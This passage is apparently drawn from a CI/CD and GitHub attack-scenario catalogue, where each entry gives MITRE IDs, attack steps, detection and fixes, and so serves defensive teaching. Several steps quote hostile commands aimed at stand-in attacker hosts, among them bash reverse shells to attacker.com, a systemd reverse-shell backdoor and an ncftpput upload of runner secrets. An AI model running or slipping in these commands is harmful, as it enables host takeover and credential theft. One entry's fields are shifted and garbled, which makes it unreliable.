- **Detection**: Process audit logs
- **Solution**: Use container isolation defaults; avoid namespace reuse
- **Tags**: #docker #namespace #processleak

## Container Escape via Cgroup Release Agent

- **Attack Type**: Container Breakout
- **Target**: Host Kernel
- **Vulnerability**: Vulnerable cgroup release_agent configuration
- **MITRE**: T1611
- **Impact**: Full host takeover from build container
- **Tools**: Linux Cgroups, Bash
- **Scenario**: Build container escapes via cgroup.release_agent abuse on vulnerable host.
- **Attack Steps**: 1. CI/CD job runs inside a container on an outdated Linux kernel vulnerable to cgroup release agent exploit.2. Attacker inside container writes to /sys/fs/cgroup to set a release_agent pointing to a shell script.3. Triggers the release agent by exiting a monitored process.4. The host executes the attacker's script with root privileges.5. Attacker gains root access on the host from inside the container.6. Fix: Harden kernel, upgrade host OS, and restrict cgroup access inside containers.
- **Detection**: Kernel version + behavior monitoring
- **Solution**: Block cgroup access, use container security modules
- **Tags**: #cgroups #kernel #containerbreakout

## Build Container Uses Host Docker to Modify Other Containers

- **Attack Type**: Container Breakout
- **Target**: Host Docker Engine
- **Vulnerability**: Docker socket exposure allows full control
- **MITRE**: T1611
- **Impact**: Modification of unrelated containers or systems
- **Tools**: Docker CLI
- **Scenario**: Build container abuses access to Docker daemon to stop/modify other containers.
- **Attack Steps**: 1. Host grants Docker socket access (/var/run/docker.sock) to the CI container.2. Attacker lists containers using docker ps.3. Modifies environment or mounts new volume into a production container using docker exec.4. Attacker injects a backdoor, copies secrets, or stops critical containers.5. Changes are unnoticed unless monitoring exists for Docker daemon API usage.6. Fix: Never expose Docker socket unless absolutely necessary.
- **Detection**: Docker audit logs
- **Solution**: Enforce socket isolation or use rootless Docker
- **Tags**: #dockersocket #privilegeescalation

## Unsecured Docker Build ARG Exposes Secrets

- **Attack Type**: Secret Exposure via Build ARG
- **Target**: Docker Build
- **Vulnerability**: Secrets exposed through insecure ARG usage
- **MITRE**: T1552.001
- **Impact**: Credential leakage from build history
- **Tools**: Docker, GitHub Actions
- **Scenario**: Secrets passed using --build-arg get logged or stored in images.
- **Attack Steps**: 1. CI job runs a docker build with secrets passed using --build-arg (e.g., --build-arg API_KEY=abc123).2. ARG value is visible in the image build history (docker history).3. Attacker with image access extracts secrets using docker inspect.4. Alternatively, GitHub Actions logs show ARG values in plaintext.5. Fix: Use build-time secrets feature or secrets manager integration.
- **Detection**: Dockerfile inspection
- **Solution**: Avoid --build-arg for secrets; use secrets API
- **Tags**: #dockerbuild #arg #secretleak

## Dockerfile with Insecure COPY Leaks .ssh Directory

- **Attack Type**: Unsafe Dockerfile Instruction
- **Target**: Dockerfile / Image
- **Vulnerability**: Sensitive files included in build context
- **MITRE**: T1552.004
- **Impact**: SSH private key exposure via container registry
- **Tools**: Docker
- **Scenario**: Developer copies whole working dir, including .ssh, into container image.
- **Attack Steps**: 1. Attacker modifies Dockerfile to include COPY . /app, with build context containing .ssh.2. SSH private key is added to the container image during build.3. Container image is pushed to public/private registry.4. Anyone pulling the image can extract the .ssh/id_rsa file using docker cp.5. Fix: Use .dockerignore and limit COPY scope explicitly.
- **Detection**: Image scan tools (Trivy, Grype)
- **Solution**: Always .dockerignore secrets, audit Dockerfile
- **Tags**: #dockerfile #sshkey #containerleak

## Shared Runner with Reused Workspaces Exposes Previous Builds

- **Attack Type**: Workspace Residue Attack
- **Target**: Shared Runner
- **Vulnerability**: No cleanup between jobs on shared runner
- **MITRE**: T1083
- **Impact**: Info disclosure and lateral privilege abuse
- **Tools**: GitLab, GitHub Runners
- **Scenario**: Shared runner reuses the same workspace across pipeline jobs.
- **Attack Steps**: 1. Runner is configured to cache/reuse workspace (e.g., /builds/group/project).2. Attacker submits a PR with a job that lists or reads previous files from disk.3. Finds .env, node_modules, or build logs from earlier runs.4. Extracts secrets or sensitive configs leaked by other jobs.5. Fix: Enable job isolation or wipe workspace after every build.
- **Detection**: Audit workspace reuse
- **Solution**: Always clean workdir post-job
- **Tags**: #runner #artifactleak #ciisolation

## Build Container Exploits Vulnerable Kernel via Dirty Pipe

- **Attack Type**: Kernel Escape
- **Target**: Linux Kernel
- **Vulnerability**: Dirty Pipe kernel vuln allows write to host
- **MITRE**: T1068
- **Impact**: Full host takeover via kernel exploit
- **Tools**: CVE-2022-0847 Exploit, Bash
- **Scenario**: Unpatched host allows escape using Dirty Pipe vulnerability.
- **Attack Steps**: 1. Build runs on a host with Linux kernel vulnerable to Dirty Pipe (CVE-2022-0847).2. Attacker compiles exploit code inside the build job.3. Writes to /etc/passwd or /etc/sudoers on host by abusing write-through-pipe bug.4. Creates a new user with root privileges or injects backdoor.5. Host is compromised without alert.6. Fix: Patch host kernel and disable container capabilities.
- **Detection**: Kernel version monitoring, behavior alerts
- **Solution**: Patch CVE promptly, limit kernel attack surface
- **Tags**: #dirtypipe #linuxkernel #ciattack

## Compromising Cloud Environment via Leaked CI/CD Token

- **Attack Type**: Initial Access via CI Leakage
- **Target**: GitHub Actions + AWS
- **Vulnerability**: Secrets committed to version control
- **MITRE**: T1552.001
- **Impact**: Unauthorized cloud access via public leak
- **Tools**: GitHub Actions, AWS CLI, curl, jq
- **Scenario**: Attacker leverages a leaked GitHub token with cloud permissions to enter the cloud environment
- **Attack Steps**: 1. A developer mistakenly commits a GitHub Actions secret token (GH_TOKEN) into a public repository.2. The attacker, monitoring public commits or using tools like truffleHog, finds the leaked token quickly.3. The attacker verifies the token is still active by making a test request: curl -H "Authorization: token $GH_TOKEN" https://api.github.com/user.4. The token has access to private repositories. Attacker enumerates all private repos via curl and downloads all workflows (.github/workflows/*.yml).5. One workflow reveals hardcoded AWS credentials used for automated cloud deployments.6. Attacker configures the AWS CLI with those credentials and confirms access using aws sts get-caller-identity.7. Now authenticated to the target AWS account, attacker lists all available EC2 instances using aws ec2 describe-instances and begins scanning S3 buckets.8. Sensitive logs, build artifacts, or SSH keys are found in an exposed S3 bucket (aws s3 ls s3://dev-backups), which are downloaded.9. Attacker now has full access to the CI/CD pipeline, cloud assets, and possibly production workloads.10. All this began with a single leaked token — which was committed by accident in a code push.Remediation: Rotate leaked tokens, audit secrets in git history, enable GitHub token scanning alerts.
- **Detection**: GitHub token scan, AWS access logs
- **Solution**: Rotate leaked secrets, use vaults, audit git history
- **Tags**: #tokenleak #github #aws #initialaccess

## Abusing CI/CD Webhook for Lateral Access to On-Prem Server

- **Attack Type**: CI Webhook Abuse
- **Target**: On-prem GitLab + Network
- **Vulnerability**: Weak webhook validation and internal runner
- **MITRE**: T1190
- **Impact**: Network pivoting from CI pipeline
- **Tools**: GitLab CI, Netcat, ssh, Webhooks
- **Scenario**: Malicious actor uses CI/CD webhook to pivot into internal infrastructure
- **Attack Steps**: 1. A GitLab instance is configured to trigger CI/CD pipelines via HTTP webhooks whenever a commit is pushed.2. The attacker discovers the exposed GitLab instance and creates a fork of a public project with open merge requests.3. They add a new webhook that triggers their malicious CI job — and include a reverse shell command in the pipeline config.4. The pipeline runs on a self-hosted GitLab Runner within the organization’s internal network.5. The malicious step executes: bash -i >& /dev/tcp/attacker.com/4444 0>&1, opening a reverse shell.6. Since the runner is behind the firewall, the attacker now has shell access inside the protected network.7. From the runner, they perform internal reconnaissance using ip a, netstat, and nmap to locate services on other internal machines.8. Credentials reused between CI jobs or stored in environment variables allow further lateral movement using ssh into build or staging servers.9. Attacker plants backdoors and exfiltrates internal data using encrypted HTTP POSTs to an attacker-controlled API.10. All of this originated from a seemingly innocent webhook that was abused for persistence and pivoting.Fix: Validate webhook sources, restrict runner networks, and log all webhook events.
- **Detection**: Netflow, webhook activity logs
- **Solution**: Restrict CI webhook access to trusted sources
- **Tags**: #webhook #cicd #pivot

## Initial Access via Pull Request Build Injection

- **Attack Type**: PR-Based Initial Access
- **Target**: GitHub Actions
- **Vulnerability**: Untrusted PR jobs allowed to run blindly
- **MITRE**: T1059.004
- **Impact**: Remote shell access to CI/CD infrastructure
- **Tools**: GitHub Actions, Burp Suite, Reverse Shell
- **Scenario**: Pull request triggers CI/CD build with injected command leading to shell access
- **Attack Steps**: 1. An open-source project allows any external user to submit pull requests (PRs), which trigger GitHub Actions for CI testing.2. The attacker submits a PR that includes a modified .github/workflows/test.yml with the following job step:run: bash -c 'bash -i >& /dev/tcp/attacker.tld/9001 0>&1'3. GitHub Actions automatically executes the build for this PR using a self-hosted runner.4. The runner is not sandboxed, and the command is executed with full host access.5. A reverse shell connects back to the attacker, giving them live shell access to the runner host.6. Attacker uses the shell to list active processes (ps aux) and discover plaintext secrets in /home/runner/.env.7. They dump secrets and SSH keys, pivot into other servers using ssh -i ~/.ssh/id_rsa dev@internalhost.8. Lateral movement allows attacker to access internal systems beyond the build scope.9. Incident remains unnoticed because builds are assumed safe and aren’t sandboxed.10. Fix: Untrusted PRs should use sandboxed runners with limited access, or require approval before build execution.Detection: Alert on unknown outbound network connections during builds.
- **Detection**: Monitor build job network traffic
- **Solution**: Sandbox runners for PR builds
- **Tags**: #prbuild #githubactions #runnerabuse

## Credential Discovery via CI/CD Pipeline Logs

- **Attack Type**: Log Exposure
- **Target**: Jenkins
- **Vulnerability**: Secrets in plaintext build logs
- **MITRE**: T1552.003
- **Impact**: Full cloud access from log exposure
- **Tools**: Jenkins, AWS CLI, grep, wget
- **Scenario**: Pipeline logs expose sensitive tokens used in previous deployments
- **Attack Steps**: 1. An attacker gains access to the Jenkins web UI, which is publicly exposed with weak credentials or previously compromised.2. Jenkins logs pipeline output by default, including sensitive echo or export commands.3. The attacker browses to recent build logs, and searches for export AWS_SECRET_ACCESS_KEY= or curl -H "Authorization:.4. They find plaintext cloud API keys used in a deployment job log, e.g., AWS_ACCESS_KEY_ID=AKIA....5. Using those credentials, attacker configures AWS CLI locally and confirms access using aws s3 ls.6. They enumerate services, download deployment scripts, and find exposed AMIs.7. Laterally, they access secrets managers, download .pem files, or overwrite cloud functions.8. No alerts are triggered because the access appears to be from a legitimate Jenkins build.9. Logs were accessible simply by browsing the Jenkins UI — no sophisticated exploit required.10. Fix: Scrub sensitive values from logs, and implement role-based access controls (RBAC) in Jenkins.Tip: Enable secrets masking in Jenkins or use external vault integrations.
- **Detection**: Jenkins web logs
- **Solution**: Scrub secrets, restrict log access, rotate keys
- **Tags**: #jenkins #pipelineleak #secrets

## Exploiting Misconfigured CI/CD to Inject Systemd Backdoor

- **Attack Type**: Build System Abuse
- **Target**: GitLab Runner Host
- **Vulnerability**: Root CI/CD jobs without constraints
- **MITRE**: T1543.002
- **Impact**: Persistent remote access to build host
- **Tools**: GitLab CI, Bash, Systemd
- **Scenario**: Attacker abuses unrestricted post-build step to plant persistent root service
- **Attack Steps**: 1. Attacker contributes a PR to a repo that includes a .gitlab-ci.yml build script.2. The repo runs on a self-hosted GitLab Runner installed on a shared Linux server.3. The CI job has root privileges (due to misconfiguration) and executes arbitrary shell commands.4. The attacker adds a job step: echo "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/1337 0>&1'" > /etc/systemd/system/persist.service5. They then execute: systemctl daemon-reexec && systemctl start persist.6. A root-level systemd service is now running permanently, establishing reverse shell persistence.7. Even if the job ends, the backdoor continues operating independently.8. The attacker can now reconnect to the compromised server at any time.9. Detection is hard unless service creation logs or outbound TCP are monitored.10. Fix: Never allow CI jobs to run as root; use containers with non-root users.Advanced Tip: Monitor /etc/systemd/ changes via inotify or auditd.
- **Detection**: Systemd logs, outbound shell connections
- **Solution**: CI jobs must run non-root, monitor service creation
- **Tags**: #systemd #backdoor #gitlab

## CI/CD Config Tampering to Deploy Malicious App in Production

- **Attack Type**: Pipeline Injection
- **Target**: GitOps CI/CD
- **Vulnerability**: Git-pipeline trust boundary not enforced
- **MITRE**: T1608.001
- **Impact**: Malicious app silently deployed to prod
- **Tools**: Kubernetes, Helm, GitOps, ArgoCD
- **Scenario**: Attacker modifies deployment YAML to insert malware into prod app
- **Attack Steps**: 1. An attacker gains access to a Git repository that stores Kubernetes deployment manifests used for GitOps (e.g., ArgoCD syncs from this repo).2. They modify the deployment.yaml file to point the image from a malicious registry:image: attacker-registry.com/malicious-app:v1.03. The GitOps tool (e.g., ArgoCD) detects the change and automatically deploys it to production within minutes.4. The malicious container starts in prod, which contains a hidden reverse proxy and credential scraper.5. Attacker begins receiving internal traffic and credentials via their listener.6. Devs don’t notice because the app appears to function normally.7. Fix: Require signed commits, enforce image allowlists, and perform out-of-band verification for changes.Detection: Set alerts for changes in critical Git paths (like deployment files).
- **Detection**: GitOps logs, registry audit, runtime monitoring
- **Solution**: Signed commits, image trust policies, 2FA
- **Tags**: #gitops #argo #k8s

## Use of Public GitHub Action That Contains Obfuscated Malware

- **Attack Type**: Supply Chain Abuse
- **Target**: GitHub Actions
- **Vulnerability**: Unsigned third-party action with malware
- **MITRE**: T1195.002
- **Impact**: Secrets and pipeline control stolen
- **Tools**: GitHub Actions Marketplace, JavaScript
- **Scenario**: Malicious GitHub Action used unknowingly by developer in pipeline
- **Attack Steps**: 1. An attacker publishes a GitHub Action to the public Marketplace with a helpful-sounding name like actions/upload-release-artifact.2. The action contains obfuscated JavaScript that executes an external script from attacker domain.3. A developer unknowingly references this action in their workflow:uses: attacker/upload-release-artifact@v1.04. When the CI job runs, the malicious JavaScript executes inside the runner.5. It downloads a second-stage payload that exfiltrates environment secrets.6. The attacker now has full CI/CD environment access.7. Fix: Always pin actions to SHA, and audit third-party actions before use.Note: Marketplace entries aren’t always reviewed deeply — verify first.
- **Detection**: GitHub logs, network monitoring
- **Solution**: Pin trusted actions, verify Marketplace listings
- **Tags**: #actions #supplychain #javascript

## CI/CD as Initial Entry via Developer Access Tokens

- **Attack Type**: Initial Access
- **Target**: GitHub
- **Vulnerability**: Stolen developer PAT with CI/CD access
- **MITRE**: T1078
- **Impact**: Full compromise of dev pipeline and cloud
- **Tools**: GitHub CLI, gh, Git
- **Scenario**: Compromised developer token grants attacker CI/CD access to private org pipelines
- **Attack Steps**: 1. A developer loses control of their GitHub Personal Access Token (PAT) due to phishing or infostealer malware.2. Attacker logs into GitHub CLI (gh auth login) using the token.3. They now have read/write access to private repos, CI workflows, and can create new Actions.4. Attacker adds malicious build steps or steals secrets from existing pipeline configurations.5. From here, they access CI caches, secrets, and runner logs to move into prod environments.6. Fix: Enforce token expiration, use SSO-bound tokens, and alert on PAT misuse.Detection: Monitor token use from unusual IPs or geolocations.
- **Detection**: GitHub audit logs, IP geoalerts
- **Solution**: Use short-lived, scoped tokens with 2FA
- **Tags**: #pat #tokenabuse #initialaccess

## Data Exfiltration from Runner to External FTP via Pipeline

- **Attack Type**: Data Exfiltration
- **Target**: CI Runner
- **Vulnerability**: Egress control missing in pipeline host
- **MITRE**: T1041
- **Impact**: Silent credential exfiltration
- **Tools**: ftp, ncftpput, bash
- **Scenario**: Attacker uploads sensitive build data from runner to FTP server
- **Attack Steps**: 1. A malicious CI job step includes a shell command like:ncftpput -u attacker -p password ftp.attacker.com / stolen.env /home/runner/.env2. The job runs normally, but exfiltrates secrets to external FTP.3. Build logs show normal output; no egress inspection is applied.4. The attacker later retrieves data from their FTP server.5. Fix: Block unknown protocols outbound from CI runners, and monitor DNS and FTP usage in builds.Tip: Don’t allow CI to make arbitrary outbound connections without review.
- **Detection**: FTP log inspection, DNS logs
- **Solution**: Enforce outbound controls, inspect CI steps
- **Tags**: #ftp #exfiltration #ciabuse

## Misused Artifact Upload to Deliver Malware via CI

- **Attack Type**: Artifact Abuse
- **Target**: GitHub Actions
- **Vulnerability**: Public artifacts serve malware to others
- **MITRE**: T1204.002
- **Impact**: Supply chain malware via CI artifacts
- **Tools**: GitHub Actions, Binary Payload, Python
- **Scenario**: CI job builds and uploads malware as public artifact for others to download
- **Attack Steps**: 1. Attacker submits PR to public repo with job step that builds a Python payload using PyInstaller.2. Payload includes stealer code that runs on execution.3. Build job uploads it as artifact using actions/upload-artifact, marked public.4. Community members or testers download and run the artifact assuming it’s trusted.5. Fix: Mark all artifacts as private by default and enforce artifact scanning.Note: Artifact misuse is an often-overlooked delivery vector.
- **Detection**: Artifact access logs, AV scanning
- **Solution**: Restrict artifact visibility, scan before release
- **Tags**: #artifactabuse #payload #github

## Abusing Unmonitored Personal Access Token (PAT)

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Org
- **Vulnerability**: Inadequate monitoring of token usage in audit logs
- **MITRE**: T1078.004
- **Impact**: Unauthorized repo access without alerting
- **Tools**: GitHub CLI, PAT Token, curl
- **Scenario**: Attacker abuses a leaked PAT token in GitHub to access private repositories undetected
- **Attack Steps**: 1. Attacker gains access to a leaked or phished GitHub Personal Access Token (PAT) associated with a user account.2. They use the token to clone private repositories and enumerate org assets using GitHub CLI and API calls.3. Because audit logging for PAT usage is not being monitored, no alerts are triggered.4. The attacker maintains access over time by rotating their IP addresses.5. Security team discovers the breach only after suspicious commits appear or logs are manually reviewed.
- **Detection**: GitHub audit log (if reviewed manually)
- **Solution**: Enable audit log forwarding and alert on PAT usage
- **Tags**: #github #pat #auditlogs

## Disabling Branch Protection Without Detection

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Repository
- **Vulnerability**: No alerts on branch rule changes
- **MITRE**: T1562.001
- **Impact**: Disables critical guardrails
- **Tools**: GitHub UI, API, Audit Logs
- **Scenario**: Attacker disables branch protection rules without triggering alerts
- **Attack Steps**: 1. An insider or attacker with write/admin access disables branch protection on the main branch using the GitHub web UI or API.2. This allows pushing code directly without PR reviews or CI checks.3. Audit logs record the event, but no detection rules or alerts are in place for protection rule changes.4. Malicious commits are pushed directly to the branch.5. Blue team is unaware of the bypass unless logs are manually audited or commit diffs are reviewed.
- **Detection**: GitHub Audit Log entry (if reviewed)
- **Solution**: Create alerting for changes to branch protection via webhook/SIEM
- **Tags**: #branchbypass #githubsecurity #auditlog

## Undetected OAuth App Access to Repo Data

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Org
- **Vulnerability**: No alerting on new app installs
- **MITRE**: T1550.001
- **Impact**: Stealthy lateral data exfiltration
- **Tools**: OAuth App, GitHub API, Audit Log
- **Scenario**: A malicious OAuth app gains unauthorized access to org data via user authorization
- **Attack Steps**: 1. An attacker publishes a seemingly useful GitHub-integrated app and tricks a developer into installing it.2. The app requests scopes like repo or read:org, gaining access to private data once the user authorizes it.3. GitHub audit logs record the installation, but unless monitored, the activity goes unnoticed.4. The app uses GitHub APIs to exfiltrate data or plant malicious issues/code.5. Incident is detected weeks later via anomaly analysis or third-party security tooling.
- **Detection**: GitHub audit logs (App install events)
- **Solution**: Enable alerting on third-party app installations and review scopes
- **Tags**: #oauthabuse #ghapps #auditlogs

## Admin Role Granted Without Notification

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Org
- **Vulnerability**: No real-time alerting on role elevation
- **MITRE**: T1078.004
- **Impact**: Privilege escalation via admin promotion
- **Tools**: GitHub UI, Audit Log, GitHub API
- **Scenario**: A developer account is escalated to org admin, but the change goes unnoticed
- **Attack Steps**: 1. An attacker or malicious insider modifies a team or user’s permissions to grant themselves admin access.2. This is done via GitHub’s role management in settings or via API.3. GitHub logs the permission change in the audit log, but without any alerting setup, the action remains unnoticed.4. With admin access, the user can delete repos, alter settings, or invite collaborators.5. The Blue Team only notices after changes to repositories or org billing show signs of tampering.
- **Detection**: GitHub audit logs (role change events)
- **Solution**: Enable alerting for role changes via webhook or GitHub Security Center
- **Tags**: #roleescalation #privilege #ghaudit

## Leaked Token Used from Unusual IP with No Alert

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Account
- **Vulnerability**: Lack of geo-based anomaly detection
- **MITRE**: T1071.001
- **Impact**: Undetected token abuse from foreign IP
- **Tools**: GitHub CLI, PAT, VPN
- **Scenario**: Attacker uses token from foreign IP address, bypassing detection due to lack of IP correlation
- **Attack Steps**: 1. A developer's PAT token is exposed in a public repo or issue accidentally.2. The attacker retrieves the token and uses it via VPN or foreign IP.3. GitHub allows access, and logs show the IP, but no detection logic correlates it as suspicious.4. The attacker clones repos, accesses issues, and injects malicious code over time.5. Only a third-party review of access logs reveals the unusual geo-IP behavior.
- **Detection**: GitHub audit log + IP log (if reviewed)
- **Solution**: Use GitHub’s security alerting + third-party IP anomaly tools
- **Tags**: #geoanomaly #tokenabuse #githubmonitoring

## Audit Log Deletion Attempt via API

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Org
- **Vulnerability**: Lack of alerts on audit log access or visibility changes
- **MITRE**: T1070.004
- **Impact**: Attempted log tampering and evasion
- **Tools**: GitHub API, Admin Account
- **Scenario**: Attacker tries to delete or suppress audit logs using elevated access
- **Attack Steps**: 1. Attacker gains access to a compromised GitHub org admin account.2. They attempt to delete sensitive audit log entries via the API or restrict access to the audit log interface.3. While direct deletion is restricted, attempts to disable audit log access are logged.4. Blue Team is unaware due to lack of detection rules on these API calls.5. Attackers attempt to cover their tracks by disabling the audit log interface or rotating credentials.
- **Detection**: GitHub Audit log entries (audit.read scope)
- **Solution**: Alert on attempts to access/disable audit logs
- **Tags**: #logtampering #auditlog #evasion

## Silent Repo Visibility Change from Private to Public

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Repository
- **Vulnerability**: No alerts on repo visibility change
- **MITRE**: T1537
- **Impact**: Public code leak of sensitive infrastructure
- **Tools**: GitHub UI, Audit Log
- **Scenario**: Repo visibility changed to public without alert, leading to sensitive code leak
- **Attack Steps**: 1. A developer or attacker with write access changes a private repo to public via GitHub settings.2. The repository immediately becomes visible to the internet, exposing sensitive code.3. This change is logged in audit logs but no alert or webhook is configured.4. The attacker clones the repo before defenders realize the mistake.5. Sensitive tokens, keys, or architecture details are leaked publicly.
- **Detection**: GitHub audit logs (repo.visibility_change)
- **Solution**: Alert on repo visibility changes and enforce policies
- **Tags**: #leak #publicrepo #auditalert

## Webhook Listener Added for Data Exfiltration

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Repository
- **Vulnerability**: No detection on webhook creation events
- **MITRE**: T1041
- **Impact**: Silent continuous code surveillance
- **Tools**: GitHub UI, Burp Suite, Audit Log
- **Scenario**: Attacker adds a malicious webhook to capture repo activity
- **Attack Steps**: 1. A malicious insider adds a webhook listener to a repo or org that sends commit/PR info to an attacker-controlled server.2. The webhook silently forwards payloads for every repo event (push, issue, PR).3. GitHub audit logs record the webhook addition, but alerting is not enabled.4. The attacker exfiltrates sensitive code changes and metadata over time.5. Only a webhook audit or traffic analysis reveals the persistent leak.
- **Detection**: GitHub Audit Logs (webhook events)
- **Solution**: Monitor webhook creation and restrict external URLs
- **Tags**: #webhookabuse #codeleak #auditevents

## Abuse of Audit Log Download Feature

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Org
- **Vulnerability**: Log export misuse not monitored
- **MITRE**: T1005
- **Impact**: Recon for lateral movement and escalation
- **Tools**: GitHub API, curl
- **Scenario**: Suspicious bulk download of audit logs goes unmonitored
- **Attack Steps**: 1. An attacker with elevated GitHub access uses the audit log export API to download the entire audit trail of an organization.2. The intent is to discover who accessed what, when — enabling further targeted attacks.3. No alerts are triggered as log export actions are not monitored.4. The attacker uses insights to target high-privilege users and high-value repos.5. Blue Team remains unaware unless queried manually.
- **Detection**: GitHub API (audit log export)
- **Solution**: Alert on audit log exports and limit access scope
- **Tags**: #auditdump #ghabuse #recon

## API Token Abuse Detected Too Late via Manual Log Review

- **Attack Type**: GitHub Audit Logs Monitoring
- **Target**: GitHub Account
- **Vulnerability**: Unmonitored API key reuse
- **MITRE**: T1078.004
- **Impact**: Prolonged undetected data exfiltration
- **Tools**: GitHub API, curl, SIEM
- **Scenario**: Long-running token is misused for weeks before being noticed in logs
- **Attack Steps**: 1. A stale API token created months ago is still active and tied to a deprecated automation bot.2. The token gets exposed or reused by a former employee without revocation.3. The token is used to pull metadata and repo content repeatedly.4. GitHub logs the access events, but no one monitors them in real-time.5. After weeks of activity, the access is noticed during a quarterly log review, long after data was exfiltrated.
- **Detection**: GitHub audit logs (access_token_used events)
- **Solution**: Revoke stale tokens, enforce token expiration and alerts
- **Tags**: #apitoken #auditdelay #accessabuse

## Workflow File Modification Without Review

- **Attack Type**: CI/CD Alerting Rules
- **Target**: GitHub Repo + CI/CD
- **Vulnerability**: No alert on workflow YAML modification
- **MITRE**: T1059.006
- **Impact**: CI pipeline becomes initial access point
- **Tools**: GitHub Actions, YAML, Git CLI
- **Scenario**: A developer modifies GitHub Actions workflow YAML to add a backdoor without PR review
- **Attack Steps**: 1. A developer with direct write access commits a change to .github/workflows/deploy.yml without a pull request.2. The modified workflow includes a malicious step such as executing a reverse shell or curl command to an external server.3. Because the repo does not enforce PR reviews or workflow approval, the change is merged silently.4. The workflow executes during the next push event, leaking sensitive environment variables.5. Blue team realizes the attack only after signs of credential theft.6. There was no alerting mechanism for workflow file changes in place.
- **Detection**: GitHub webhooks, file monitoring
- **Solution**: Require PR review + alert on .github/workflows/* changes
- **Tags**: #cicd #workflowtamper #githubactions

## Unapproved Self-Hosted Runner Registered

- **Attack Type**: CI/CD Alerting Rules
- **Target**: GitHub Actions
- **Vulnerability**: No alert on new runner registration
- **MITRE**: T1557
- **Impact**: Persistent foothold in CI/CD jobs
- **Tools**: GitHub Self-Hosted Runner, VM
- **Scenario**: An attacker registers a rogue self-hosted runner that executes malicious workflows
- **Attack Steps**: 1. Attacker with minimal access to a public repo registers a self-hosted runner from their own machine.2. The runner becomes available in the org without alerting any admin.3. During CI jobs, this runner executes payloads while exfiltrating build secrets.4. Logs show normal job success, so no alarms are raised.5. The attacker retains access persistently until a runner audit is manually performed.
- **Detection**: GitHub audit log + runner inventory
- **Solution**: Alert on runner registration + runner trust validation
- **Tags**: #selfhostedrunner #cicdattack #buildpipeline

## Long-Running Build Jobs as Backdoor

- **Attack Type**: CI/CD Alerting Rules
- **Target**: CI/CD Runners
- **Vulnerability**: No alert for abnormal job duration
- **MITRE**: T1102
- **Impact**: Persistent unauthorized access channel
- **Tools**: GitHub Actions, Infinite Loop, Tmux
- **Scenario**: Malicious actor configures CI job to never exit and act as C2 channel
- **Attack Steps**: 1. Attacker modifies a CI job script to start a background tmux or reverse shell session and enters a long sleep loop (sleep 999999).2. The CI job stays alive, and the attacker tunnels into the environment through the job container.3. GitHub Actions UI shows the job as "running", but no timeout is enforced.4. No alerts are triggered for long-duration builds.5. The job is later discovered after high compute usage or by accident.
- **Detection**: CI job duration logs (manual review)
- **Solution**: Enforce max job timeout + alert on long runs
- **Tags**: #ciabuse #buildbackdoor #persistentjob

## Unauthorized Secrets Added to CI Environment

- **Attack Type**: CI/CD Alerting Rules
- **Target**: GitHub Actions
- **Vulnerability**: No alert on new secret creation
- **MITRE**: T1552.001
- **Impact**: Covert data exfiltration via CI jobs
- **Tools**: GitHub Settings, Secrets API
- **Scenario**: Attacker adds malicious secrets to CI env to enable future data access
- **Attack Steps**: 1. Attacker or insider accesses CI/CD settings and injects a new environment variable named MALICIOUS_KEY.2. This secret is added via GitHub UI or API and used in future workflows for exfiltration.3. There is no detection rule alerting on the addition of new secrets.4. Sensitive workflows begin using the malicious key, which transmits data to an external server.5. Blue team only notices during a periodic secrets inventory.
- **Detection**: GitHub secrets audit logs
- **Solution**: Alert on changes to secrets + regular audits
- **Tags**: #secretinjection #ciabuse #ghactions

## Unsafe Shell Commands in CI Scripts

- **Attack Type**: CI/CD Alerting Rules
- **Target**: bash`.2. These scripts are added as part of innocuous-looking workflow updates.3. Because CI script content isn’t scanned for dangerous patterns, no alert is raised.4. The attacker collects credentials or outputs silently.5. Detection only occurs if the external domain is blocked or flagged post-incident.
- **Vulnerability**: CI/CD Workflows
- **MITRE**: Lack of code scanning for CI shell scripts
- **Impact**: T1059.004
- **Tools**: Bash, GitHub Actions
- **Scenario**: A script includes dangerous shell commands that interact with external APIs
- **Attack Steps**: 1. A CI job script includes unsafe shell usage like `curl http://attacker.com/steal.sh
- **Detection**: Command injection via CI job
- **Solution**: Log inspection of executed commands
- **Tags**: Enforce code scanning or pre-build linting

## GitHub Actions Token Used in Non-GitHub Domains

- **Attack Type**: CI/CD Alerting Rules
- **Target**: GitHub Actions
- **Vulnerability**: Misuse of CI tokens in outside context
- **MITRE**: T1041
- **Impact**: Abuse of trust boundary via token misuse
- **Tools**: GitHub Actions, curl, Secrets
- **Scenario**: GITHUB_TOKEN used to communicate with attacker-controlled services
- **Attack Steps**: 1. A GitHub Actions workflow uses the default GITHUB_TOKEN to make authenticated calls.2. The token is passed to a script that sends requests to an external server controlled by an attacker.3. Since the domain is not GitHub-owned, this is a misuse of a CI token.4. No monitoring exists for where GITHUB_TOKEN is being used.5. Data or permissions are abused via API calls.
- **Detection**: Outbound traffic logs (if captured)
- **Solution**: Alert if CI tokens interact with unapproved domains
- **Tags**: #ghttoken #tokenabuse #cicdmonitoring

## Malicious Artifact Upload During Build

- **Attack Type**: CI/CD Alerting Rules
- **Target**: Build Pipeline
- **Vulnerability**: No scanning or integrity check for CI artifacts
- **MITRE**: T1195.002
- **Impact**: Supply chain poisoning through artifacts
- **Tools**: GitHub Packages, CI/CD
- **Scenario**: Attacker uploads a tampered binary during CI job that is not scanned
- **Attack Steps**: 1. During the packaging step of the CI/CD job, a malicious actor injects code into a compiled binary.2. The artifact is uploaded to GitHub Packages or another repo without any hash or signature checks.3. The artifact is later used downstream by other services or customers.4. No alert or review mechanism exists for artifact integrity.5. Only post-compromise forensic reveals the altered build artifact.
- **Detection**: Artifact audit + binary scan (manual)
- **Solution**: Sign and hash artifacts + scanning before release
- **Tags**: #artifactpoisoning #buildsecurity #supplychain

## Workflow Created by Untrusted Contributor

- **Attack Type**: CI/CD Alerting Rules
- **Target**: GitHub PRs
- **Vulnerability**: No restriction on PR-triggered workflows
- **MITRE**: T1203
- **Impact**: Unauthorized code execution on CI runner
